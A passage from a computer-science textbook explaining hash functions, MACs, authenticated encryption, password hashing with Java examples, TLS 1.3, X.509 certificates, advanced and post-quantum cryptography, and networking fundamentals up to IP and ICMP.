### Merkle-Damgård Construction

Used by MD5, SHA-1, SHA-2:

```
Message is padded, then split into blocks:
M₁ → M₂ → M₃ → ... → Mₗ

IV → compress(IV, M₁) = H₁ → compress(H₁, M₂) = H₂ → ... → H(M)
```

**Length extension attack:** For Merkle-Damgård hashes, knowing H(M) allows computing H(M || padding || M') without knowing M. This breaks naive HMAC constructions like `H(key || message)`.

**SHA-3 (Keccak) uses a sponge construction** that is immune to length extension attacks.

### Sponge Construction (SHA-3/Keccak)

```
State: 1600-bit permutation state

Absorbing phase:
  Each message block is XORed into the "rate" portion of state
  State permutation (Keccak-f[1600]) applied after each block

Squeezing phase:
  Read output bits from rate portion
  Apply permutation between output blocks
```

The security of a sponge with rate r and capacity c: min(c/2, n) bits.

## 13.3 Hash Algorithm Reference

| Algorithm | Output | Security | Notes |
|-----------|--------|----------|-------|
| MD5 | 128 bits | **Broken** | Collisions found in seconds |
| SHA-1 | 160 bits | **Broken** | Google SHAttered attack (2017) |
| SHA-256 | 256 bits | 128-bit | Widely used, recommended |
| SHA-384 | 384 bits | 192-bit | NSA Suite B |
| SHA-512 | 512 bits | 256-bit | Faster than SHA-256 on 64-bit |
| SHA-512/256 | 256 bits | 128-bit | SHA-512 truncated, faster on 64-bit |
| SHA3-256 | 256 bits | 128-bit | Keccak, immune to length extension |
| SHA3-512 | 512 bits | 256-bit | Keccak |
| BLAKE2b | 512 bits | 256-bit | Very fast, safer than SHA-2 |
| BLAKE3 | 256 bits | 128-bit | Fastest, parallelizable |

**Recommendation:** SHA-256 or SHA-3-256 for most uses. BLAKE3 for high-performance.

### SHA-256 Algorithm

SHA-256 processes 512-bit blocks, maintains 256-bit state:

```
Initial hash values (first 32 bits of fractional parts of √prime):
H₀ = 0x6a09e667
H₁ = 0xbb67ae85
H₂ = 0x3c6ef372
H₃ = 0xa54ff53a
H₄ = 0x510e527f
H₅ = 0x9b05688c
H₆ = 0x1f83d9ab
H₇ = 0x5be0cd19

For each 512-bit message block:
  Create message schedule W[0..63]:
    W[i] = Mᵢ for i < 16
    W[i] = σ₁(W[i-2]) + W[i-7] + σ₀(W[i-15]) + W[i-16]
  
  Compression function (64 rounds):
    Each round mixes all 8 state words using +, AND, OR, XOR, rotate
```

## 13.4 MACs — Message Authentication Codes

A MAC provides **authentication and integrity** using a shared secret key:

```
MAC(key, message) → tag
Verify(key, message, tag) → valid/invalid
```

Unlike signatures, MACs require the shared key — they don't provide non-repudiation.

### HMAC — Hash-based MAC

HMAC is the standard MAC construction:

```
HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))

Where:
  K' = K padded to block size (or H(K) if K is too long)
  ipad = 0x36 repeated (inner padding)
  opad = 0x5C repeated (outer padding)
```

**Why the two-layer structure?** The inner hash binds the message to the key. The outer hash prevents length extension attacks on the inner result.

HMAC is provably secure if the hash function is a PRF (pseudorandom function), even if the hash function has collisions.

**HMAC-SHA256** is the standard. Used in TLS, JWT, TOTP, HKDF.

### Poly1305 MAC

Poly1305 (Bernstein) is a fast one-time MAC:

```
tag = Poly1305(key, msg)
    = ((c₁×r^q + c₂×r^(q-1) + ... + c_q×r + s)) mod 2^130-5
```

Where cᵢ are message chunks, r and s are key-derived. Poly1305 is used with ChaCha20 for ChaCha20-Poly1305 AEAD.

### GCM Authentication (GHASH)

GCM uses GHASH for authentication — a polynomial MAC over GF(2^128):

```
GHASH(H, A, C) = Σ (Xᵢ × Hᵢ) over GF(2^128)
```

Where A = AAD blocks, C = ciphertext blocks.

## 13.5 Authenticated Encryption (AEAD)

**AEAD (Authenticated Encryption with Associated Data)** combines encryption + MAC in one atomic operation:

```
Encrypt: (ciphertext, tag) = AEAD_Encrypt(key, nonce, plaintext, aad)
Decrypt: plaintext = AEAD_Decrypt(key, nonce, ciphertext, tag, aad)
         OR fail if tag invalid
```

**Why AEAD is necessary:** Historically, people combined cipher + MAC incorrectly:
- **Encrypt-then-MAC (EtM)**: C = Enc(P), T = MAC(C) — Secure ✓
- **MAC-then-Encrypt (MtE)**: T = MAC(P), C = Enc(P||T) — Insecure (padding oracle)
- **Encrypt-and-MAC (E&M)**: C = Enc(P), T = MAC(P) — Leaks MAC of plaintext

AEAD avoids these composition problems. Always use an AEAD mode:
- `AES-256-GCM`
- `ChaCha20-Poly1305`
- `AES-256-CCM`

---

# Chapter 14: Key Derivation & Password Hashing

## 14.1 Key Derivation Functions (KDF)

A KDF derives one or more cryptographic keys from a source of key material (which may have insufficient entropy or wrong length).

### HKDF — HMAC-based KDF (RFC 5869)

The standard modern KDF, used in TLS 1.3, Signal, Noise:

```
HKDF consists of two steps:

1. Extract:
   PRK = HMAC-Hash(salt, IKM)
   (IKM = Input Key Material; salt = random or zeros)

2. Expand:
   OKM = T(1) || T(2) || ... (truncated to L bytes)
   T(i) = HMAC-Hash(PRK, T(i-1) || info || i)
   (info = context string binding the key to its purpose)
```

**Example uses:**
```java
// From ECDH shared secret, derive AES key + HMAC key using HKDF (Bouncy Castle):
// Maven: org.bouncycastle:bcprov-jdk18on
import org.bouncycastle.crypto.generators.HKDFBytesGenerator;
import org.bouncycastle.crypto.params.HKDFParameters;
import org.bouncycastle.crypto.digests.SHA256Digest;

byte[] salt             = new byte[32]; new SecureRandom().nextBytes(salt);
byte[] ecdhSharedSecret = /* from KeyAgreement.generateSecret() */ ;

HKDFBytesGenerator hkdf = new HKDFBytesGenerator(new SHA256Digest());
hkdf.init(new HKDFParameters(ecdhSharedSecret, salt, "context".getBytes()));

byte[] aesKey  = new byte[32]; hkdf.generateBytes(aesKey,  0, 32); // AES-256 key
byte[] hmacKey = new byte[32]; hkdf.generateBytes(hmacKey, 0, 32); // HMAC-SHA256 key

// TLS 1.3 uses HKDF internally — Java's TLS stack does this automatically
```

### PBKDF2 — Password-Based KDF 2

PBKDF2 (RFC 2898) is designed to be slow — making brute-force attacks against passwords expensive:

```
DK = PRF(Password, Salt || INT(i))  iterated c times

More precisely:
  F(P, S, c, i) = U₁ ⊕ U₂ ⊕ ... ⊕ U_c
  where U₁ = PRF(P, S||i), Uₖ = PRF(P, U_{k-1})
  DK = F(P, S, c, 1) || F(P, S, c, 2) || ...
```

**Parameters:**
- `c` = iteration count (higher = slower = more secure)
  - NIST recommends 600,000 iterations with HMAC-SHA256 (2023)
  - OWASP recommends 600,000 for SHA256, 210,000 for SHA512
- `salt` = random 16+ bytes (prevents rainbow tables, makes each hash unique)
- Output length = desired key length

## 14.2 Password Hashing

**Never store passwords in plaintext.** Never store salted-MD5 or salted-SHA1 either — they're too fast.

Password hashing algorithms are intentionally slow and memory-hard:

### bcrypt

The gold standard for password hashing since 1999:

```
$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8X3UJ2o2YeGq.GjVl3a
  ─── ── ──────────────────────────────────────────────────────
   │  │  └─ Base64(salt || hash) = 53 chars
   │  └──── Cost factor (12 = 2^12 = 4096 iterations)
   └─────── Version ($2b$ is current)
```

**Cost factor:** Each increment doubles the time. Cost 12 ≈ 300ms, cost 14 ≈ 1.2 seconds.

```java
// bcrypt in Java — using Spring Security Crypto (or jBCrypt library)
// Maven: org.springframework.security:spring-security-crypto
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12); // strength = cost factor 12
// Hash a password
String hashed = encoder.encode("password");
// Verify
boolean valid = encoder.matches("password", hashed); // true

// --- Alternative: using jBCrypt directly ---
// Maven: org.mindrot:jbcrypt:0.4
// String hashed = BCrypt.hashpw("password", BCrypt.gensalt(12));
// boolean valid  = BCrypt.checkpw("password", hashed);
```

**Limitation:** bcrypt has a 72-character password limit and 4KB memory requirement (not memory-hard enough for modern GPUs).

### scrypt

scrypt (Colin Percival, 2009) is designed to be both CPU-hard and **memory-hard**:

```
scrypt(Password, Salt, N, r, p, dkLen)

Parameters:
  N = CPU/memory cost (e.g., 2^15 = 32768)
  r = block size (e.g., 8 → 8×128 bytes = 1024 bytes per block)
  p = parallelism (e.g., 1)
  
Memory used: N × r × 128 bytes
```

Memory hardness makes GPU/ASIC attacks much harder — parallel attacks require proportionally more memory.

### Argon2 (Winner of Password Hashing Competition 2015)

Argon2 is the current recommendation:

- **Argon2id**: Best for password hashing (combines Argon2i and Argon2d)
- **Argon2i**: Data-independent, resistant to side-channel
- **Argon2d**: Data-dependent, resistant to GPU attacks

```
Argon2id(password, salt, time_cost, memory_cost, parallelism, hash_len)

OWASP recommended parameters (2023):
  time_cost:   3 iterations
  memory_cost: 64 MB (65536 KB)
  parallelism: 4 threads
```

```java
// Argon2id in Java — using Bouncy Castle (recommended) or argon2-jvm
// Maven: org.bouncycastle:bcprov-jdk18on  or  de.mkammerer:argon2-jvm

// Option 1: argon2-jvm library (simplest)
import de.mkammerer.argon2.Argon2;
import de.mkammerer.argon2.Argon2Factory;

Argon2 argon2 = Argon2Factory.createAdvanced(Argon2Factory.Argon2Types.ARGON2id);
// Hash: iterations=3, memory=65536 KB (64MB), parallelism=4
String hash = argon2.hash(3, 65536, 4, "password123".toCharArray());
// Verify
boolean valid = argon2.verify(hash, "password123".toCharArray());
argon2.wipeArray("password123".toCharArray()); // clear password from memory

// Option 2: Bouncy Castle Argon2 (no extra dependency)
import org.bouncycastle.crypto.generators.Argon2BytesGenerator;
import org.bouncycastle.crypto.params.Argon2Parameters;
byte[] salt = new byte[16]; new SecureRandom().nextBytes(salt);
Argon2Parameters params = new Argon2Parameters.Builder(Argon2Parameters.ARGON2_id)
    .withSalt(salt).withIterations(3).withMemoryAsKB(65536).withParallelism(4).build();
Argon2BytesGenerator gen = new Argon2BytesGenerator();
gen.init(params);
byte[] hash32 = new byte[32];
gen.generateBytes("password123".toCharArray(), hash32);
```

### Password Hashing Comparison

| Algorithm | Memory Hard | GPU Resistant | Recommended |
|-----------|------------|--------------|-------------|
| MD5 + salt | ❌ | ❌ | **Never** |
| SHA-256 + salt | ❌ | ❌ | **Never** |
| bcrypt | ❌ (4KB) | Somewhat | OK (legacy) |
| scrypt | ✅ | ✅ | OK |
| Argon2id | ✅ ✅ | ✅ ✅ | **Best** |

## 14.3 Key Stretching and Salting

**Salt:** A random value added to each password before hashing:
```
hash = H(salt || password)
store: (salt, hash)
```

Why salting matters:
- Without salt: identical passwords produce identical hashes → rainbow table attack works
- With salt: each password has unique salt → precomputed tables useless
- Salt does NOT need to be secret — just unique per password

**Pepper:** A secret value stored separately from the database:
```
hash = Argon2id(password, salt, pepper)
```
If the database is stolen without the pepper (stored in an HSM/environment variable), the hashes cannot be cracked.

---

# Chapter 15: TLS/SSL — Securing the Web

## 15.1 TLS Overview

**Transport Layer Security (TLS)** is the cryptographic protocol that secures the majority of internet traffic. When you see `https://` in your browser, TLS is at work.

TLS operates between the transport layer (TCP) and application layer (HTTP):

```
Application Layer  HTTP/SMTP/IMAP/etc.
                      ↕
   TLS Layer        Handshake + Record Protocol
                      ↕
  Transport Layer     TCP
                      ↕
   Network Layer      IP
```

**TLS history:**
| Version | Year | Status |
|---------|------|--------|
| SSL 2.0 | 1995 | Broken |
| SSL 3.0 | 1996 | Broken (POODLE) |
| TLS 1.0 | 1999 | Deprecated |
| TLS 1.1 | 2006 | Deprecated |
| TLS 1.2 | 2008 | Acceptable |
| TLS 1.3 | 2018 | **Current standard** |

## 15.2 TLS 1.3 Handshake

TLS 1.3 dramatically simplified and secured the handshake vs TLS 1.2:

```
Client                                    Server
──────                                    ──────
ClientHello:
  - Supported cipher suites
  - Key Share (ECDHE public key)
  - Supported TLS versions
─────────────────────────────────────────────→

                                         ServerHello:
                                           - Selected cipher suite
                                           - Key Share (server ECDHE public key)
                                         {EncryptedExtensions}
                                         {Certificate}
                                         {CertificateVerify}
                                         {Finished}
←─────────────────────────────────────────────

{Certificate} (optional, for mutual TLS)
{CertificateVerify} (optional)
{Finished}
─────────────────────────────────────────────→

  Application Data (encrypted)  ←────────→  Application Data (encrypted)
```

Key improvements in TLS 1.3:
- **1-RTT handshake** (down from 2 in TLS 1.2)
- **0-RTT resumption** for returning connections (with replay caveats)
- **Only secure cipher suites**: TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, TLS_AES_128_GCM_SHA256
- **Forward secrecy mandatory** (only ECDHE key exchange)
- **No weak features**: no RSA key exchange, no CBC, no RC4, no MD5, no SHA-1

## 15.3 TLS 1.3 Key Derivation

TLS 1.3 uses HKDF to derive all session keys from the ECDHE shared secret:

```
0-RTT:
  PSK → Early Secret → early_data_key

1-RTT:
  ECDHE → Handshake Secret → handshake_key (client + server)
  Handshake Secret → Master Secret → application_key (client + server)

Each direction has separate keys:
  client_write_key  ← encrypts Client→Server
  server_write_key  ← encrypts Server→Client
  client_write_iv   ← nonce base for client
  server_write_iv   ← nonce base for server
```

## 15.4 TLS Record Protocol

After the handshake, data is sent in **TLS records**:

```
┌────────────────────────────────────────────────┐
│ Content Type (1 byte): 23=Application Data     │
│ Legacy Version (2 bytes): 0x0303               │
│ Length (2 bytes)                               │
├────────────────────────────────────────────────┤
│ Encrypted Data = AEAD(data || type || padding) │
└────────────────────────────────────────────────┘
```

AEAD encryption uses the session key and a per-record nonce (derived by XORing the IV with the record sequence number).

## 15.5 Common TLS Attacks

### Downgrade Attacks
Attacker manipulates the ClientHello to force use of weaker protocols/ciphers. Mitigated by:
- TLS_FALLBACK_SCSV (RFC 7507)
- TLS 1.3's handshake transcript in Finished message

### BEAST (Browser Exploit Against SSL/TLS)
- Affected TLS 1.0 CBC mode
- Exploited predictable IVs
- Fixed: TLS 1.1+ uses explicit random IVs; TLS 1.3 eliminates CBC

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- Exploited SSL 3.0 CBC padding oracle
- Fixed: disable SSL 3.0; TLS 1.3 eliminates CBC

### Heartbleed (CVE-2014-0160)
- Buffer over-read in OpenSSL's heartbeat extension
- Could leak server private keys, session keys, user passwords from server memory
- Not a TLS protocol flaw — an implementation bug
- Fixed: OpenSSL 1.0.1g

### CRIME/BREACH
- CRIME: compressed TLS records reveal data via length oracle
- BREACH: HTTP-level compression oracle for CSRF tokens
- Fixed: disable TLS compression; BREACH mitigated by per-request nonces

## 15.6 Certificate Pinning

TLS trusts any certificate signed by any trusted CA. Certificate pinning adds an extra check: only trust a specific certificate or public key for a specific domain.

Used in mobile apps to prevent MITM even with rogue CA:

```java
import java.security.*;
import java.security.cert.X509Certificate;
import java.util.Base64;

// Pin a specific public key hash (SPKI pin — standard approach)
private static final String PINNED_SPKI_HASH =
    "sha256//YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=";

static boolean verifyPin(X509Certificate cert) throws Exception {
    // Extract the Subject Public Key Info (DER encoded)
    byte[] spkiDer = cert.getPublicKey().getEncoded(); // X.509 / SubjectPublicKeyInfo
    // SHA-256 hash it
    MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
    byte[] digest = sha256.digest(spkiDer);
    // Base64 encode and compare
    String pin = "sha256//" + Base64.getEncoder().encodeToString(digest);
    return MessageDigest.isEqual(pin.getBytes(), PINNED_SPKI_HASH.getBytes());
}
// Use with custom TrustManager in SSLContext for Android/Java HTTPS clients
```

---

# Chapter 16: PKI & X.509 Certificates

## 16.1 Public Key Infrastructure

**PKI (Public Key Infrastructure)** is the system of people, policies, and technology that manages public key certificates. It solves the problem of trust: "I have a public key — but how do I know it actually belongs to who I think it does?"

### Certificate Authorities (CAs)

A **CA** is a trusted third party that vouches for the binding between an identity and a public key by signing certificates:

```
Certificate = {identity, public_key, validity, extensions} + CA_signature
```

**Trust hierarchy:**

```
Root CA (self-signed, in browser/OS trust store)
  └── Intermediate CA (signed by Root)
       └── Intermediate CA 2 (optional, signed by Intermediate CA)
            └── End-Entity Certificate (for example.com)
```

Why intermediate CAs? The Root CA's private key is kept **offline** in an HSM in a vault. If an intermediate CA is compromised, it can be revoked without affecting the root.

**Browser trust stores** contain ~130-150 trusted root CAs. Any of them can sign for any domain — the "weakest link" problem.

## 16.2 X.509 Certificate Structure

```
Certificate:
  Data:
    Version: 3 (v3)
    Serial Number: 04:00:00:00:00:01:15:4b:5a:c3:94
    Signature Algorithm: sha256WithRSAEncryption
    Issuer: C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA
    Validity:
      Not Before: Nov 27 00:00:00 2024 GMT
      Not After:  Dec 25 23:59:59 2025 GMT
    Subject: CN=www.example.com, O=Internet Corporation for Assigned Names, C=US
    Subject Public Key Info:
      Public Key Algorithm: id-ecPublicKey
      Public-Key: (256 bit)
      pub: 04:6b:17:d1:f2:e1:2c:42:47:f8:bc:e6...
    X509v3 Extensions:
      X509v3 Subject Alternative Name:
        DNS:www.example.com, DNS:example.com
      X509v3 Key Usage: critical
        Digital Signature, Key Agreement
      X509v3 Extended Key Usage:
        TLS Web Server Authentication, TLS Web Client Authentication
      X509v3 CRL Distribution Points:
        URI:http://crl3.digicert.com/ssca-sha2-g7.crl
      Authority Information Access:
        OCSP - URI:http://ocsp.digicert.com
        CA Issuers - URI:http://cacerts.digicert.com/ssca.crt
      X509v3 Basic Constraints: critical
        CA:FALSE
  Signature Algorithm: sha256WithRSAEncryption
  Signature Value:
    8c:85:5a:67:32:5d:03...
```

## 16.3 Certificate Validation

When a TLS client receives a certificate:

1. **Chain building**: Find a path from the end-entity cert to a trusted root
2. **Signature verification**: Verify each certificate in the chain is signed by its issuer
3. **Validity period**: Not Before ≤ Now ≤ Not After
4. **Name matching**: The hostname matches the CN or a Subject Alternative Name (SAN)
5. **Key usage**: Extended Key Usage includes "TLS Web Server Authentication"
6. **Revocation check**: Certificate has not been revoked (CRL or OCSP)

### Certificate Revocation

**CRL (Certificate Revocation List):**
- CA publishes a signed list of revoked serial numbers
- Clients download and check the CRL
- Problem: CRLs can be large, become stale between updates

**OCSP (Online Certificate Status Protocol):**
- Client queries OCSP responder: "Is serial number X still valid?"
- Real-time check
- Problem: Privacy (CA learns which sites you visit), latency, OCSP responder may be down

**OCSP Stapling:**
- Server fetches OCSP response from CA and "staples" it to the TLS handshake
- Client gets signed OCSP response from server — no need to contact CA
- Best of both worlds: real-time, private, low latency

## 16.4 Certificate Transparency (CT)

Certificate Transparency (RFC 6962) requires all publicly trusted CAs to log every certificate they issue to public, auditable logs. Browsers reject certificates not in CT logs.

**Benefits:**
- Detects unauthorized certificates (e.g., a rogue CA issuing for google.com)
- Historic record of all certificates ever issued
- Domain owners can monitor for unauthorized certs

## 16.5 Let's Encrypt & ACME

**Let's Encrypt** (2016) provides free, automated TLS certificates via the **ACME protocol (RFC 8555)**:

```
1. Client requests certificate for example.com
2. ACME server sends challenge: "Put this token at http://example.com/.well-known/acme-challenge/TOKEN"
3. Client places file (HTTP-01 challenge) or DNS record (DNS-01 challenge)
4. ACME server verifies domain ownership
5. CA signs certificate, returns to client
6. Client installs certificate
7. Automated renewal every 60-90 days
```

---

# Chapter 17: Advanced Cryptographic Protocols

## 17.1 Zero-Knowledge Proofs (ZKP)

A **Zero-Knowledge Proof** allows a prover to convince a verifier that they know a secret, without revealing the secret itself.

**Example: Cave of Ali Baba (Peggy & Victor)**
```
                    ────────
                   │        │
         ─────────  entrance  ─────────
        │ Path A                Path B │
        │    ┌────── magic door ───────┘
        │                              │
        └──────────────────────────────┘
```

1. Victor waits outside. Peggy goes in, takes either path A or B.
2. Victor shouts "Come out from path A!" (or B, randomly)
3. Peggy comes out from the required path (using the magic door if necessary)
4. Repeat 20 times → probability of cheating = (1/2)^20 ≈ 10^-6

This is **interactive ZKP**: Peggy proves knowledge of the magic word without revealing it.

### Properties of ZKP

- **Completeness**: If the prover knows the secret, the verifier is convinced
- **Soundness**: A cheating prover cannot convince the verifier (with high probability)
- **Zero-Knowledge**: The verifier learns nothing about the secret except that it exists

### Non-Interactive ZKP (NIZK)

In practice, proofs must be non-interactive (single message). This is achieved via the **Fiat-Shamir transformation**: replace the verifier's random challenges with H(transcript) — the hash serves as a random oracle.

**Applications:**
- **zk-SNARKs** (zero-knowledge succinct non-interactive arguments of knowledge) — used in privacy-preserving blockchains (Zcash)
- **zk-STARKs** — transparent (no trusted setup), post-quantum
- **FIDO2/WebAuthn** — password-less authentication using ZKP-like schemes
- **Bulletproofs** — efficient range proofs (amounts in transactions are positive without revealing value)

## 17.2 Secure Multi-Party Computation (MPC)

MPC allows multiple parties to jointly compute a function over their private inputs, without revealing those inputs to each other.

**Millionaires Problem (Yao):** Alice and Bob each know their salary. They want to know who earns more, without revealing the actual salary.

**Applications:**
- Private set intersection (two companies check for common customers without revealing their full lists)
- Threshold key management (3-of-5 parties must cooperate to sign a transaction)
- Secure auctions (winning bid revealed, all losing bids stay private)
- Privacy-preserving machine learning (train models on sensitive data without data sharing)

## 17.3 Homomorphic Encryption

**Homomorphic encryption (HE)** allows computation on ciphertext, producing an encrypted result that decrypts to the correct plaintext result:

```
Enc(a) + Enc(b) = Enc(a + b)   (additive homomorphism)
Enc(a) × Enc(b) = Enc(a × b)   (multiplicative homomorphism)
```

**Fully Homomorphic Encryption (FHE)** supports both operations — enabling arbitrary computation on encrypted data. The server never sees the plaintext.

**Applications:**
- Cloud computing on private data (medical, financial)
- Private information retrieval (query a database without revealing what you're looking for)

**Current status:** FHE is computationally expensive (100,000× overhead vs unencrypted), but improving rapidly. Microsoft SEAL, OpenFHE, and TFHE are active libraries.

## 17.4 Post-Quantum Cryptography

Quantum computers threaten RSA, ECC, and DH:

**Grover's Algorithm:** Searches an unsorted database of N items in √N time. Halves the effective security of symmetric algorithms (AES-128 → 64-bit against quantum; AES-256 → 128-bit — still safe).

**Shor's Algorithm:** Factors integers in polynomial time — **breaks RSA, DSA, DH, and all ECC** once large enough quantum computers exist.

As of 2024, quantum computers with enough qubits to break current cryptography don't exist, but we must prepare now (data encrypted today may still be sensitive in 10-20 years — "harvest now, decrypt later" attacks).

### NIST Post-Quantum Standardization

NIST finalized post-quantum standards in 2024 (FIPS 203, 204, 205):

**CRYSTALS-Kyber (ML-KEM, FIPS 203):**
- Key Encapsulation Mechanism
- Based on Module Learning With Errors (MLWE)
- Replacing ECDH for key exchange
- Key sizes: ~800-1568 bytes (vs 32 bytes for X25519)

**CRYSTALS-Dilithium (ML-DSA, FIPS 204):**
- Digital signature scheme
- Based on MLWE and Module Short Integer Solution
- Replacing ECDSA/Ed25519 for signatures
- Signature size: ~2420-4595 bytes (vs 64 bytes for Ed25519)

**SPHINCS+ (SLH-DSA, FIPS 205):**
- Hash-based signature scheme
- Conservative: security based only on hash function security
- Larger signatures but very well-understood security

**Migration strategy:**
1. **Hybrid schemes**: TLS_ECDHE_kyber768 (combine classical + PQ for both)
2. Inventory all cryptographic assets
3. Update cryptographic agility (ability to swap algorithms)
4. Prioritize: network encryption first, then signatures, then storage

---

---

# PART V — COMPUTER NETWORKS

---

# Chapter 18: Networking Fundamentals & the OSI Model

## 18.1 Why Layered Models?

Networks are complex. A layered model breaks this complexity into manageable pieces where each layer:
- Provides services to the layer above
- Uses services from the layer below
- Communicates with its peer layer on the other host via a protocol

## 18.2 The OSI Model (7 Layers)

```
┌──────────────────────────────────────────────────────────────────┐
│ Layer 7 │ APPLICATION  │ HTTP, SMTP, DNS, FTP, SSH              │
│ Layer 6 │ PRESENTATION │ Encryption (TLS), encoding (MIME, XDR) │
│ Layer 5 │ SESSION      │ NetBIOS, PPTP, session management       │
│ Layer 4 │ TRANSPORT    │ TCP, UDP, SCTP                         │
│ Layer 3 │ NETWORK      │ IP (IPv4/IPv6), ICMP, routing          │
│ Layer 2 │ DATA LINK    │ Ethernet, Wi-Fi, ARP, 802.1Q VLAN      │
│ Layer 1 │ PHYSICAL     │ Cables, fiber, radio waves, signaling  │
└──────────────────────────────────────────────────────────────────┘
```

**Memory aid:** "All People Seem To Need Data Processing" (top to bottom) or "Please Do Not Throw Sausage Pizza Away" (bottom to top).

**Data encapsulation** (sending side):
```
Application data
  → Segment (L4 adds TCP/UDP header)
    → Packet (L3 adds IP header)
      → Frame (L2 adds Ethernet header + trailer)
        → Bits (L1 transmits on wire)
```

## 18.3 The TCP/IP Model (Practical 4-Layer Model)

The real internet uses the TCP/IP model (also called the Internet model):

```
┌──────────────────────────────────────────────────────────┐
│ Application  │ HTTP, DNS, SMTP, SSH, FTP    (OSI 5-7)   │
│ Transport    │ TCP, UDP                     (OSI 4)      │
│ Internet     │ IP, ICMP, OSPF, BGP          (OSI 3)      │
│ Link         │ Ethernet, Wi-Fi, ARP         (OSI 1-2)    │
└──────────────────────────────────────────────────────────┘
```

---

# Chapter 19: Physical & Data Link Layer

## 19.1 Physical Layer

The physical layer transmits raw bits over a medium:

**Transmission media:**
- **Copper (twisted pair)**: Cat5e (1Gbps), Cat6 (10Gbps), Cat8 (25-40Gbps)
- **Coaxial cable**: TV, some WAN links
- **Fiber optic**: Gigabit to 400Gbps+, immune to EMI, long distances
- **Radio (wireless)**: Wi-Fi, cellular, Bluetooth

**Encoding schemes:** NRZ, Manchester encoding, 4B/5B, 8B/10B — converting bits to electrical/optical signals.

## 19.2 Ethernet (IEEE 802.3)

Ethernet is the dominant wired LAN technology.

### Ethernet Frame

```
┌─────────┬────────┬────────┬──────┬─────────────────┬─────┐
│Preamble │  Dst   │  Src   │Type/ │     Payload      │ FCS │
│ 7 bytes │MAC 6B  │MAC 6B  │Len 2B│   46-1500 bytes  │ 4B  │
└─────────┴────────┴────────┴──────┴─────────────────┴─────┘
```

**MAC Address:** 48-bit hardware address, e.g., `AA:BB:CC:DD:EE:FF`
- First 3 bytes: OUI (Organizationally Unique Identifier — the vendor)
- Last 3 bytes: Device-specific
- `FF:FF:FF:FF:FF:FF` = broadcast
- Multicast: first byte's LSB = 1

**EtherType:** 0x0800 = IPv4, 0x0806 = ARP, 0x86DD = IPv6, 0x8100 = 802.1Q VLAN

## 19.3 Switching and MAC Tables

A **Layer 2 switch** forwards frames based on MAC addresses:
- Maintains a **CAM table** (MAC → port mapping)
- Learns by watching source MACs of incoming frames
- Forwards unknown destinations to all ports (flooding)
- Forwards known destinations to the learned port only

**VLANs (802.1Q):** Logically separate broadcast domains on the same physical switch. VLAN tagging adds a 4-byte tag to Ethernet frames.

## 19.4 ARP — Address Resolution Protocol

ARP resolves IPv4 addresses to MAC addresses.

```
When Alice (192.168.1.10) wants to send to Bob (192.168.1.20):

1. ARP Request (broadcast):
   "Who has 192.168.1.20? Tell 192.168.1.10"
   Sent to FF:FF:FF:FF:FF:FF

2. ARP Reply (unicast, from Bob):
   "192.168.1.20 is at 00:11:22:33:44:55"

3. Alice caches: 192.168.1.20 → 00:11:22:33:44:55
   Now sends frames directly to Bob's MAC.
```

**ARP Cache:** Entries expire after 30-60 seconds (varies by OS).

**ARP Spoofing Attack:** An attacker sends gratuitous ARP replies poisoning the ARP cache — directing traffic through the attacker (MITM). Defense: Dynamic ARP Inspection (DAI) on switches.

---

# Chapter 20: IP Networking

## 20.1 IPv4

IPv4 uses 32-bit addresses: four octets in dotted decimal notation (e.g., `192.168.1.1`).

### IPv4 Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─────────┬───────────┬──────────────────────────────────────────┤
│ Version │    IHL    │    DSCP / ECN    │       Total Length   │
├─────────────────────┼──────────────────────────────────────────┤
│      Identification  │ Flags │      Fragment Offset           │
├─────────────────────┼────────────────────────────────────────┤
│       TTL           │    Protocol      │    Header Checksum  │
├────────────────────────────────────────────────────────────────┤
│                       Source IP Address                        │
├────────────────────────────────────────────────────────────────┤
│                    Destination IP Address                       │
└────────────────────────────────────────────────────────────────┘
```

**Key fields:**
- **TTL** (Time to Live): Decremented at each router. Packet discarded at 0. Prevents infinite loops.
- **Protocol**: 6=TCP, 17=UDP, 1=ICMP, 89=OSPF
- **Fragmentation**: Large packets can be fragmented at routers (IP MTU)

### Subnetting

A **subnet mask** defines which bits of an IP address are the network portion and which are the host portion.

```
IP:   192.168.1.100   = 11000000.10101000.00000001.01100100
Mask: 255.255.255.0   = 11111111.11111111.11111111.00000000
CIDR: /24

Network:   192.168.1.0
Broadcast: 192.168.1.255
Hosts:     192.168.1.1 – 192.168.1.254 (254 hosts)
```

**CIDR (Classless Inter-Domain Routing):** `/n` notation where n = number of network bits.

```
/24 = 256 addresses, 254 usable hosts
/25 = 128 addresses, 126 usable hosts
/30 = 4 addresses, 2 usable hosts (point-to-point links)
/32 = 1 address (host route)
```

**Private IP ranges (RFC 1918):**
```
10.0.0.0/8         → 16.7 million addresses
172.16.0.0/12      → 1 million addresses
192.168.0.0/16     → 65,536 addresses
```

### NAT (Network Address Translation)

NAT allows many private IPs to share one public IP. The NAT router maintains a translation table:

```
Internal         NAT Table              External
192.168.1.10:54321  →  203.0.113.5:54321  →  8.8.8.8:80
192.168.1.11:54322  →  203.0.113.5:54322  →  8.8.8.8:80
```

Outgoing packets: source IP/port rewritten to public IP/port
Return packets: destination IP/port rewritten back to internal

## 20.2 IPv6

IPv6 addresses are 128 bits, written in hexadecimal groups:
`2001:0db8:85a3:0000:0000:8a2e:0370:7334`

Leading zeros and consecutive all-zero groups can be compressed:
`2001:db8:85a3::8a2e:370:7334`

**IPv6 address types:**
- Global unicast: `2000::/3` (publicly routable)
- Link-local: `fe80::/10` (single link, not routed)
- Loopback: `::1`
- Multicast: `ff00::/8`

**IPv6 improvements over IPv4:**
- 340 undecillion addresses (end to end reachability without NAT)
- IPSec support built-in
- No broadcast (replaced with multicast)
- Simplified header (no fragmentation, no checksum)
- Stateless Address Autoconfiguration (SLAAC)

## 20.3 ICMP and Network Diagnostics

ICMP (Internet Control Message Protocol) provides error messages and diagnostics:

| Type | Code | Meaning |
|------|------|---------|
| 0 | 0 | Echo Reply (ping response) |
